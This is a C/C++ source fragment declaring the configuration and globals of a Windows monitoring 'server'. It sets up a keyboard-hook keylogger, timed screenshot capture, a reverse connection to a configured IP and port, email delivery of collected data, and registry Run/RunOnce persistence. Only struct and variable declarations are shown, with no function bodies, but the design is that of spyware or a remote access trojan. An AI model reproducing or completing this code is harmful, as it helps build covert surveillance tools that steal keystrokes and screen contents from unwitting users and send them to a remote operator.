


//---------------Central Structs--------------//

typedef struct
{
	TCHAR *tchrCreationDate;
	TCHAR *tchrCreationTime;
	TCHAR *tchrFileName;
	TCHAR *tchrInternalName;
	TCHAR *tchrInstallLocation;
} 
SWinMonitorServerGeneral;

typedef struct
{
	TCHAR   *tchrRegKey;
	bool     blnLocalUserRunAlways;
	bool     blnLocalMachineRunAlways;
	bool     blnLocalMachineRunOnce;
}
SWinMonitorServerRegistrySettings;

typedef struct
{
	bool    blnIncludeDate;
	bool    blnIncludeTime;
	bool    blnIncludeUser;
    long    lngUploadSize;
	TCHAR  *tchrRootDir;
	TCHAR  *tchrFilePath;
}
SWinMonitorServerKeyLogger;

typedef struct
{
	TCHAR  *tchrRootDir;
	TCHAR  *tchrSavePath;
	long    lngFileLimit;
	long    lngElapseTimeInSeconds;
}
SWinMonitorServerScreenMonitor;

typedef struct
{
	TCHAR  *tchrIP;
	long    lngPort;
	float   fltAttemptInterval;
}
SWinMonitorServerReverseConnection;

typedef struct
{
	TCHAR  *tchrEmail;
	TCHAR  *tchrEmailServer;
}
SWinMonitorServerEmail;

typedef struct
{
	TCHAR   *tchrHostName;
	long     lngListenPort;
	TCHAR   *tchrPassword;
}
SWinMonitorServerNetworkConnection;

typedef struct:public CGeneralMemoryUtility 
{
		SWinMonitorServerGeneral               SGeneral;
		SWinMonitorServerRegistrySettings      SRegistry;
		SWinMonitorServerKeyLogger             SKeyLogger;
		SWinMonitorServerScreenMonitor         SScreenMonitor;
		SWinMonitorServerNetworkConnection     SNetworkConnection;
		bool                                   blnReverseConnection;
		SWinMonitorServerReverseConnection    *SpReverseConnection;
		bool                                   blnEmail;
		SWinMonitorServerEmail                *SpEmail;
}
SWinMonitorServerConfiguration;

typedef struct
{
	TCHAR *tchrKeyLogFile;
	TCHAR *tchrScreenShotDir;
	TCHAR *tchrExeFullPath;
}
SWinMonitorStoredFiles;

//---------------//***//--------------//


//----One and only global struct for entire program

SWinMonitorServerConfiguration gbl_struct_WinMonitorServerConfig;

SWinMonitorStoredFiles         gbl_struct_WinMonitorStoredFiles;

CExtendedLinkedList<void> gbl_lnkdlst_TcpClients;

int gbl_intWndShowType=0;
HINSTANCE gbl_hinstCurrentInstance=NULL;

#define DEF_PIC_FILE_BASE                    _T("WinScreen")
#define DEF_CONFIG_INI                       _T("WinMonitorServer.Config.INI")
#define DEF_INI_APP_NAME                    (LPCSTR)"WinMonitorServer.1.0"
#define DEF_INI_FILE_NAME                   (LPCSTR)"WinMonitorServer.1.0.ini"
#define DEF_INI_KEY_KEYBOARD_HOOK_FILE      (LPCSTR)"WinMonitorServer.1.0.KEYBOARD_HOOK_FILE"
#define DEF_INI_KEY_KEYBOARD_HOOK_INC_DATE  (LPCSTR)"WinMonitorServer.1.0.KEYBOARD_HOOK_INC_DATE"
#define DEF_INI_KEY_KEYBOARD_HOOK_INC_TIME  (LPCSTR)"WinMonitorServer.1.0.KEYBOARD_HOOK_INC_TIME"
#define DEF_INI_KEY_KEYBOARD_HOOK_INC_USER  (LPCSTR)"WinMonitorServer.1.0.KEYBOARD_HOOK_INC_USER"

MethodRetBoolArgVoid InstallKBrdHook=0,UnInstallKBrdHook=0;

HANDLE  gbl_hScreenSnatcherThread=NULL; 
bool    gbl_blnContinueScreenSnatching=false;

bool    gbl_blnContinueReverseConnection=false;
HANDLE  gbl_hReverseConnectionThread=NULL; 

void   *gbl_ReverseClient=NULL;
